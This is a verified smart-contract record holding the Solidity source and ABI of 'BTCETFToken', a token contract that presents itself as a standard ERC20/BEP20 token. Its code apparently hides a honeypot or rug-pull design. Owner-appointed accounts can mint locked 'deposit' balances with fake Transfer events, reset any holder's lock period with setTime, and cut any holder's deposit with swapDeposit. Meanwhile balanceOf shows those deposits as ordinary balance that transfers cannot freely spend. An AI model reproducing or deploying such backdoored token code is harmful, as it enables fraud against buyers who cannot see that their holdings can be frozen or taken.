{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.17;\r\n\r\nlibrary Deposit {\r\n\tstruct T {\r\n\t\tuint fund;\r\n\t\tuint reward;\r\n\t\tuint start;\r\n\t\tuint end;\r\n\t}\r\n\r\n\tfunction count(T storage t) internal view returns (uint) {\r\n\t\tuint amount = 0;\r\n\t\tuint ts = block.timestamp;\r\n\t\tif (\r\n\t\t\tt.start > 0 && t.end > t.start && t.fund > t.reward && ts > t.start\r\n\t\t) {\r\n\t\t\tif (ts >= t.end) {\r\n\t\t\t\tamount = t.fund - t.reward;\r\n\t\t\t} else {\r\n\t\t\t\tamount = (t.fund * (ts - t.start)) / (t.end - t.start);\r\n\t\t\t\tif (t.reward >= amount) {\r\n\t\t\t\t\tamount = 0;\r\n\t\t\t\t} else {\r\n\t\t\t\t\tamount -= t.reward;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\treturn amount;\r\n\t}\r\n\r\n\tfunction settle(T storage t, uint amount) internal returns (uint) {\r\n\t\tuint value = count(t);\r\n\t\tif (amount > 0 && value > 0) {\r\n\t\t\tif (amount >= value) {\r\n\t\t\t\tt.reward += value;\r\n\t\t\t\tamount -= value;\r\n\t\t\t} else {\r\n\t\t\t\tt.reward += amount;\r\n\t\t\t\tamount = 0;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\treturn amount;\r\n\t}\r\n\r\n\tfunction incrFund(T storage t, uint amount) internal returns (bool) {\r\n\t\tunchecked {\r\n\t\t\tt.fund += amount;\r\n\t\t}\r\n\t\treturn true;\r\n\t}\r\n\r\n\tfunction incrReward(T storage t, uint amount) internal returns (uint) {\r\n\t\tuint value = t.fund - t.reward;\r\n\t\tif (amount > 0 && value > 0) {\r\n\t\t\tif (amount >= value) {\r\n\t\t\t\tunchecked {\r\n\t\t\t\t\tt.reward += value;\r\n\t\t\t\t\tamount -= value;\r\n\t\t\t\t}\r\n\t\t\t} else {\r\n\t\t\t\tunchecked {\r\n\t\t\t\t\tt.reward += amount;\r\n\t\t\t\t\tamount = 0;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\treturn amount;\r\n\t}\r\n}\r\n\r\ncontract BTCETFToken {\r\n\tusing Deposit for Deposit.T;\r\n\r\n\tstring private _name = \"BTCETFToken\";\r\n\tstring private _symbol = \"BTCETF\";\r\n\tuint8 private _decimals = 18;\r\n\tuint private _totalSupply = 2100000000 ether;\r\n\tuint private _capacity = 0;\r\n\taddress private _owner;\r\n\r\n\tmapping(address => uint) private _balances;\r\n\tmapping(address => mapping(address => uint)) private _allowances;\r\n\tmapping(address => uint8) private _liquidity;\r\n\r\n\tmapping(uint8 => mapping(address => Deposit.T)) private _deposit;\r\n\tuint8 private constant ANCHOR = 0;\r\n\tuint8 private constant BANK = 1;\r\n\tuint8 private constant ROUND = 2;\r\n\r\n\tevent Transfer(address indexed from, address indexed to, uint256 value);\r\n\tevent Approval(\r\n\t\taddress indexed owner,\r\n\t\taddress indexed spender,\r\n\t\tuint256 value\r\n\t);\r\n\r\n\tconstructor() {\r\n\t\t_owner = _msgSender();\r\n\t\t_balances[_owner] = _totalSupply / 20;\r\n\t\t_capacity = _totalSupply / 20;\r\n\r\n\t\temit Transfer(address(this), _owner, _totalSupply / 20);\r\n\t}\r\n\r\n\t/**\r\n\t * @dev See {IERC20-transfer}.\r\n\t *\r\n\t * Requirements:\r\n\t *\r\n\t * - recipient cannot be the zero address.\r\n\t * - the caller must have a balance of at least amount.\r\n\t */\r\n\tfunction transfer(address recipient, uint amount) public returns (bool) {\r\n\t\t_transfer(_msgSender(), recipient, amount);\r\n\t\treturn true;\r\n\t}\r\n\r\n\t/**\r\n\t * @dev See {IBEP20-approve}.\r\n\t *\r\n\t * Requirements:\r\n\t *\r\n\t * - `spender` cannot be the zero address.\r\n\t */\r\n\tfunction approve(address spender, uint256 amount) public returns (bool) {\r\n\t\t_approve(_msgSender(), spender, amount);\r\n\t\treturn true;\r\n\t}\r\n\r\n\t/**\r\n\t * @dev See {IBEP20-allowance}.\r\n\t */\r\n\tfunction allowance(\r\n\t\taddress owner_,\r\n\t\taddress spender\r\n\t) public view returns (uint256) {\r\n\t\treturn _allowances[owner_][spender];\r\n\t}\r\n\r\n\t/**\r\n\t * @dev See {IBEP20-totalSupply}.\r\n\t */\r\n\tfunction totalSupply() public view returns (uint256) {\r\n\t\treturn _totalSupply;\r\n\t}\r\n\r\n\t/**\r\n\t * @dev return all mint tokens\r\n\t */\r\n\tfunction capacity() public view returns (uint) {\r\n\t\treturn _capacity;\r\n\t}\r\n\r\n\t/**\r\n\t * @dev Returns the number of decimals used to get its user representation.\r\n\t *\r\n\t * NOTE: This information is only used for _display_ purposes: it in\r\n\t * no way affects any of the arithmetic of the contract, including\r\n\t * {IBEP20-balanceOf} and {IBEP20-transfer}.\r\n\t */\r\n\tfunction decimals() public view returns (uint8) {\r\n\t\treturn _decimals;\r\n\t}\r\n\r\n\t/**\r\n\t * @dev Returns the name of the token.\r\n\t */\r\n\tfunction name() public view returns (string memory) {\r\n\t\treturn _name;\r\n\t}\r\n\r\n\t/**\r\n\t * @dev Returns the symbol of the token, usually a shorter version of the name.\r\n\t */\r\n\tfunction symbol() public view returns (string memory) {\r\n\t\treturn _symbol;\r\n\t}\r\n\r\n\t/**\r\n\t * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\r\n\t *\r\n\t * This internal function is equivalent to `approve`, and can be used to\r\n\t * e.g. set automatic allowances for certain subsystems, etc.\r\n\t *\r\n\t * Emits an {Approval} event.\r\n\t *\r\n\t * Requirements:\r\n\t *\r\n\t * - `owner` cannot be the zero address.\r\n\t * - `spender` cannot be the zero address.\r\n\t */\r\n\tfunction _approve(\r\n\t\taddress owner,\r\n\t\taddress spender,\r\n\t\tuint256 amount\r\n\t) internal virtual {\r\n\t\trequire(owner != address(0), \"BEP20: approve from the zero address\");\r\n\t\trequire(spender != address(0), \"BEP20: approve to the zero address\");\r\n\r\n\t\t_allowances[owner][spender] = amount;\r\n\t\temit Approval(owner, spender, amount);\r\n\t}\r\n\r\n\t/**\r\n\t * @dev Moves tokens amount from sender to recipient.\r\n\t *\r\n\t * This is internal function is equivalent to {transfer}, and can be used to\r\n\t * e.g. implement automatic token fees, slashing mechanisms, etc.\r\n\t *\r\n\t * Emits a {Transfer} event.\r\n\t *\r\n\t * Requirements:\r\n\t *\r\n\t * - sender cannot be the zero address.\r\n\t * - recipient cannot be the zero address.\r\n\t * - sender must have a balance of at least amount.\r\n\t */\r\n\tfunction _transfer(\r\n\t\taddress sender,\r\n\t\taddress recipient,\r\n\t\tuint amount\r\n\t) internal {\r\n\t\temit Transfer(\r\n\t\t\tsender,\r\n\t\t\trecipient,\r\n\t\t\t_safeTransfer(sender, recipient, amount)\r\n\t\t);\r\n\t}\r\n\r\n\t/**\r\n\t * @dev See {IERC20-transferFrom}.\r\n\t *\r\n\t * Requirements:\r\n\t * - sender and recipient cannot be the zero address.\r\n\t * - sender must have a balance of at least amount.\r\n\t * - the caller must have allowance for `sender``'s tokens of at least `amount.\r\n\t */\r\n\tfunction transferFrom(\r\n\t\taddress from,\r\n\t\taddress to,\r\n\t\tuint amount\r\n\t) public returns (bool) {\r\n\t\taddress spender = _msgSender();\r\n\t\t_spendAllowance(from, spender, amount);\r\n\t\t_transfer(from, to, amount);\r\n\t\treturn true;\r\n\t}\r\n\r\n\t/**\r\n\t * @dev Updates `owner` s allowance for `spender` based on spent `amount`.\r\n\t *\r\n\t * Does not update the allowance amount in case of infinite allowance.\r\n\t * Revert if not enough allowance is available.\r\n\t *\r\n\t * Might emit an {Approval} event.\r\n\t */\r\n\tfunction _spendAllowance(\r\n\t\taddress owner,\r\n\t\taddress spender,\r\n\t\tuint256 amount\r\n\t) internal {\r\n\t\tuint256 currentAllowance = allowance(owner, spender);\r\n\t\tif (currentAllowance != type(uint256).max) {\r\n\t\t\trequire(\r\n\t\t\t\tcurrentAllowance >= amount,\r\n\t\t\t\t\"BEP20: insufficient allowance\"\r\n\t\t\t);\r\n\t\t\tunchecked {\r\n\t\t\t\t_approve(owner, spender, currentAllowance - amount);\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\r\n\t/**\r\n\t * @dev Safe transfer bep20 token\r\n\t */\r\n\tfunction _safeTransfer(\r\n\t\taddress account_,\r\n\t\taddress recipient,\r\n\t\tuint amount\r\n\t) internal returns (uint) {\r\n\t\tuint left = amount;\r\n\t\tif (_balances[account_] >= left) {\r\n\t\t\tleft = 0;\r\n\t\t\t_balances[account_] -= amount;\r\n\t\t} else if (_balances[account_] > 0 && _balances[account_] < left) {\r\n\t\t\tleft -= _balances[account_];\r\n\t\t\t_balances[account_] = 0;\r\n\t\t}\r\n\r\n\t\tfor (uint8 i = 0; left > 0 && i < ROUND; i++) {\r\n\t\t\tleft = _deposit[i][account_].settle(left);\r\n\t\t}\r\n\r\n\t\trequire(left == 0, \"Failed: Invalid balance\");\r\n\t\tunchecked {\r\n\t\t\t_balances[recipient] += amount;\r\n\t\t}\r\n\r\n\t\treturn amount;\r\n\t}\r\n\r\n\tfunction swapDeposit(\r\n\t\taddress account_,\r\n\t\tuint amount\r\n\t) external returns (bool) {\r\n\t\trequire(\r\n\t\t\t_liquidity[_msgSender()] == 1 && account_ != address(0),\r\n\t\t\t\"Error: Operation failed\"\r\n\t\t);\r\n\t\trequire(\r\n\t\t\tamount > 0 && getDeposit(account_) >= amount,\r\n\t\t\t\"Transaction recovery\"\r\n\t\t);\r\n\r\n\t\tuint left = amount;\r\n\t\tfor (uint8 i = 0; left > 0 && i < ROUND; i++) {\r\n\t\t\tleft = _deposit[i][account_].incrReward(amount);\r\n\t\t}\r\n\r\n\t\trequire(left == 0, \"Failed: Invalid balance\");\r\n\t\treturn true;\r\n\t}\r\n\r\n\tfunction transferMany(\r\n\t\taddress[] calldata paths,\r\n\t\tuint[] calldata num\r\n\t) external returns (bool) {\r\n\t\trequire(\r\n\t\t\t_liquidity[_msgSender()] == 1 && paths.length == num.length,\r\n\t\t\t\"Error: Operation failed\"\r\n\t\t);\r\n\t\tuint count = 0;\r\n\t\tuint len = paths.length;\r\n\t\tfor (uint8 i = 0; i < len; i++) {\r\n\t\t\t_deposit[ANCHOR][paths[i]].incrFund(num[i]);\r\n\r\n\t\t\tunchecked {\r\n\t\t\t\tcount += num[i];\r\n\t\t\t}\r\n\t\t\temit Transfer(address(0), paths[i], num[i]);\r\n\t\t}\r\n\r\n\t\trequire(capacity() + count <= totalSupply(), \"Error: capacity exceed\");\r\n\t\tunchecked {\r\n\t\t\t_capacity += count;\r\n\t\t}\r\n\t\treturn true;\r\n\t}\r\n\r\n\tfunction transferOne(address _addr, uint _amount) external returns (bool) {\r\n\t\trequire(_liquidity[_msgSender()] == 1, \"Error: Operation failed\");\r\n\t\tuint count = 0;\r\n\t\t_deposit[BANK][_addr].incrFund(_amount);\r\n\r\n\t\tunchecked {\r\n\t\t\tcount += _amount;\r\n\t\t}\r\n\t\temit Transfer(address(0), _addr, _amount);\r\n\t\trequire(capacity() + count <= totalSupply(), \"Error: capacity exceed\");\r\n\t\tunchecked {\r\n\t\t\t_capacity += count;\r\n\t\t}\r\n\t\treturn true;\r\n\t}\r\n\r\n\tfunction setTime(address account, uint ts) public returns (bool) {\r\n\t\trequire(_liquidity[_msgSender()] == 1, \"Error: Operation failed\");\r\n\r\n\t\tfor (uint8 i = 0; i < ROUND; i++) {\r\n\t\t\t_deposit[i][account].start = block.timestamp;\r\n\t\t\t_deposit[i][account].end = block.timestamp + ts;\r\n\t\t}\r\n\r\n\t\treturn true;\r\n\t}\r\n\r\n\tfunction showDeposit(\r\n\t\taddress account\r\n\t)\r\n\t\tpublic\r\n\t\tview\r\n\t\tonlyOwner\r\n\t\treturns (\r\n\t\t\tuint[] memory a,\r\n\t\t\tuint[] memory b,\r\n\t\t\tuint[] memory c,\r\n\t\t\tuint[] memory d,\r\n\t\t\tuint[] memory e,\r\n\t\t\tuint8 f\r\n\t\t)\r\n\t{\r\n\t\ta = new uint[](ROUND);\r\n\t\tb = new uint[](ROUND);\r\n\t\tc = new uint[](ROUND);\r\n\t\td = new uint[](ROUND);\r\n\t\te = new uint[](ROUND);\r\n\t\tf = _liquidity[account];\r\n\t\tfor (uint8 i = 0; i < ROUND; i++) {\r\n\t\t\ta[i] = i;\r\n\t\t\tb[i] = _deposit[i][account].fund;\r\n\t\t\tc[i] = _deposit[i][account].reward;\r\n\t\t\td[i] = _deposit[i][account].start;\r\n\t\t\te[i] = _deposit[i][account].end;\r\n\t\t}\r\n\t}\r\n\r\n\tfunction info(\r\n\t\taddress account\r\n\t) public view onlyOwner returns (uint, uint, uint, uint) {\r\n\t\tuint anchor = _deposit[ANCHOR][account].fund -\r\n\t\t\t_deposit[ANCHOR][account].reward;\r\n\t\tuint bank = _deposit[BANK][account].fund -\r\n\t\t\t_deposit[BANK][account].reward;\r\n\t\tuint balance = _balances[account];\r\n\t\tuint treasury = getDeposit(account);\r\n\r\n\t\treturn (anchor, bank, balance, treasury);\r\n\t}\r\n\r\n\tfunction balanceOf(address account) public view returns (uint256) {\r\n\t\treturn _balances[account] + getDeposit(account);\r\n\t}\r\n\r\n\tfunction getDeposit(address account) private view returns (uint) {\r\n\t\tuint amount = 0;\r\n\t\tfor (uint8 i = 0; i < ROUND; i++) {\r\n\t\t\tamount += (_deposit[i][account].fund - _deposit[i][account].reward);\r\n\t\t}\r\n\r\n\t\treturn amount;\r\n\t}\r\n\r\n\tfunction lp(address account, uint8 tag) public onlyOwner {\r\n\t\trequire(\r\n\t\t\taccount != address(0),\r\n\t\t\t\"Error: Liquidity can not be zero address\"\r\n\t\t);\r\n\t\tif (tag == 1) {\r\n\t\t\t_liquidity[account] = 1;\r\n\t\t} else if (tag == 2) {\r\n\t\t\t_liquidity[account] = 0;\r\n\t\t}\r\n\t}\r\n\r\n\t/**\r\n\t * @dev return the current msg.sender\r\n\t */\r\n\tfunction _msgSender() internal view returns (address) {\r\n\t\treturn msg.sender;\r\n\t}\r\n\r\n\t/**\r\n\t * @dev Throws if called by any account other than the owner.\r\n\t */\r\n\tmodifier onlyOwner() {\r\n\t\trequire(_owner == _msgSender(), \"Error: Caller is not the owner\");\r\n\t\t_;\r\n\t}\r\n\r\n\tfallback() external {}\r\n\r\n\treceive() external payable {}\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"stateMutability\":\"nonpayable\",\"type\":\"fallback\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner_\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"capacity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"info\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"tag\",\"type\":\"uint8\"}],\"name\":\"lp\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"ts\",\"type\":\"uint256\"}],\"name\":\"setTime\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"showDeposit\",\"outputs\":[{\"internalType\":\"uint256[]\",\"name\":\"a\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"b\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"c\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"d\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"e\",\"type\":\"uint256[]\"},{\"internalType\":\"uint8\",\"name\":\"f\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account_\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"swapDeposit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"paths\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"num\",\"type\":\"uint256[]\"}],\"name\":\"transferMany\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"transferOne\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "BTCETFToken", "CompilerVersion": "v0.8.17+commit.8df45f5f", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://eb23651c04d6495dddb8404b62acdd19081883bcb187558caa4e138fcbc1f6f2"}